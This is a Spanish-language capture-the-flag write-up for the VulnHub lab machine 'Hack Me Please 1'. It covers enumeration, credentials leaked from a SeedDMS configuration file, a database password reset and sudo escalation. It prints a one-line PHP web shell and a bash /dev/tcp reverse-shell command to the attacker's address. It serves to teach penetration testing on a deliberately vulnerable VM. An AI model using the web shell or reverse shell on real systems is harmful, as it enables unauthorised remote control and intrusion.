#ctf-machine #vulnhub #easy-machine #linux  [Vulnhub Link](https://www.vulnhub.com/entry/hack-me-please-1,731/)

## Enumeración inicial
Primeramente hacemos un escaneo ARP con `arp-scan` para identificar la IP de la máquina víctima:
![[Pasted image 20240902183903.png]]

Como vemos la IP de la máquina víctima es la "192.168.159.151" ya que el OUI de la dirección MAC es el "00:0c" correspondiente a las máquinas que se importan en VMWare.

Lanzamos una traza ICMP con `ping` y como vemos el TTL=64 por lo que podemos decir que probablemente estemos ante una máquina Linux, ya que suelen tener este valor de TTL.
![[Pasted image 20240902183941.png]]

### Nmap
Lanzamos un primer escaneo con `nmap` para identificar los puertos TCP abiertos en la máquina:
![[Pasted image 20240902184039.png]]

Como vemos hay 3 puertos abiertos, el puerto 80, 3306 y 33060.

Hacemos un segundo escaneo para detectar la versión y servicio de cada uno de estos puertos:
![[Pasted image 20240902184241.png]]

Como vemos corre el servicio Apache 2.4.41 de Ubuntu y el servicio MySQL 8.0.25.

## Enumeración web
Si accedemos a la página web, vemos la siguiente página principal:
![[Pasted image 20240902184422.png]]

Si analizamos el código JS de `main.js` de la web, vemos el siguiente comentario:
![[Pasted image 20240902190928.png]]

Por lo que si accedemos vemos lo siguiente:
![[Pasted image 20240902191006.png]]

No tenemos credenciales por lo que si buscamos en internet podemos extraer que SeedDMS utiliza un archivo de configuración dentro de `/conf/settings.xml` . Por lo que si accedemos a:
http://192.168.159.151/seeddms51x/conf/settings.xml

Vemos un archivo XML de configuración donde podemos extraer unas credenciales de la base de datos:
![[Pasted image 20240902191834.png]]

Por lo que podemos conectarnos a la máquina víctima con estas credenciales:
![[Pasted image 20240902192105.png]]

Si extraemos los datos de la tabla users de la base de datos "seeddms", podemos ver una contraseña:
![[Pasted image 20240902192051.png]]

Si extraemos los datos de la tabla "tblUsers" podemos extraer 2 usuarios más con 1 contraseña:
![[Pasted image 20240902192537.png]]

Pero como tenemos acceso a la base de datos, podemos cambiarle la contraseña. Utilizando md5  ya que `hashid` nos indica que probablemente sea md5:
![[Pasted image 20240902193523.png]]

Por lo que computamos el `md5sum` de la cadena "password":
![[Pasted image 20240902193616.png]]

Y la introducimos en la base de datos:
![[Pasted image 20240902193821.png]]

Por lo que si accedemos con las credenciales, obtenemos acceso:
![[Pasted image 20240902193937.png]]

Una vez dentro podemos subir un archivo PHP malicioso dentro de "Add document":
![[Pasted image 20240902194118.png]]

Y le establecemos por un lado el nombre:
![[Pasted image 20240902194157.png]]

Y, por otro lado, el archivo a subir:
![[Pasted image 20240902194257.png]]

El archivo PHP contiene lo siguiente:
```php
<?php system($_GET["cmd"]); ?>
```

Una vez subido si accedemos a la página principal veremos que ya aparece:
![[Pasted image 20240902194722.png]]

Por lo que si hacemos *hover* en el archivo podremos ver su id:
![[Pasted image 20240902194808.png]]

Por lo que si accedemos a `/data/1048576/4/1.php`, tendremos acceso al archivo, por lo que accedemos a:
http://192.168.159.151/seeddms51x/data/1048576/4/1.php?cmd=whoami

Tenemos RCE:
![[Pasted image 20240902195018.png]]

Y podemos entablarnos una *reverse shell* con el comando:
```bash
bash -c "bash -i >& /dev/tcp/192.168.159.131/443 0>&1"
```

Por lo que si nos podemos en escucha con `nc` por el puerto 443, obtenemos la *reverse* *shell*:
![[Pasted image 20240902195154.png]]

Así que hacemos el tratamiento de la TTY:
![[Pasted image 20240902195249.png]]
![[Pasted image 20240902195337.png]]

## Escalada de privilegios
Si listamos los usuarios del sistema, vemos que existe el usuario "saket" por lo que podemos intentar migrar de usuario con la credencial que tenemos:
![[Pasted image 20240902195506.png]]
![[Pasted image 20240902195657.png]]

Si listamos los permisos a nivel de *sudoers* de "saket" vemos que puede ejecutar cualquier comando como *root*, por lo que ejecutamos `sudo su` y ya somos el usuario *root*:
![[Pasted image 20240902200003.png]]
![[Pasted image 20240902200014.png]]

___
#information-leakage #file-upload-attacks #abusing-sudoers #web-enumeration 
___